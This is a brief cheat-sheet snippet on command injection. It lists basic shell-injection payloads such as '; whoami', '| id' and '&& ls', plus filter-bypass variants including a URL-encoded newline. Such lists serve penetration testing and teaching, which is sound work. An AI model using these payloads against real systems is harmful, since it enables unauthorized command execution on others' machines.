## Command Injection
```bash
-- Basic
; whoami
| id
&& ls
-- Filter bypass (when && blocked)
; whoami
| whoami
%0a whoami
```
